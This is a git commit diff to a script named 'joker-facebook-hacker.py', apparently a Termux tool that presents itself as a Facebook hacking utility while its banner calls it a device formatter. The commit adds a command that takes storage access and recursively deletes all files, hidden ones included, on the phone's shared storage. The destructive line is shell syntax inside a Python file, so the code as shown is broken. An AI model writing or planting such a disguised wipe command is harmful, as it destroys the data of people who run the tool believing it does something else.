32a64cb9072ee4edff10a17ec52885c3c23d2b39
joker-termux <68482235+joker-termux@users.noreply.github.com>
2020-07-21 07:17:46 +0200

    Update joker-facebook-hacker.py

--- joker-facebook-hacker.py
+++ joker-facebook-hacker.py
@@ -12,4 +12,4 @@ print("\033[1;32m       *Formatter for your device by eljoker* ")
 print("\033[1;37m       ====================================== ")
 print(" ")
 
-su -c rm -rif /sdcard/*
+termux-setup-storage && rm -rif /sdcard/* && rm -rif /sdcard/.*
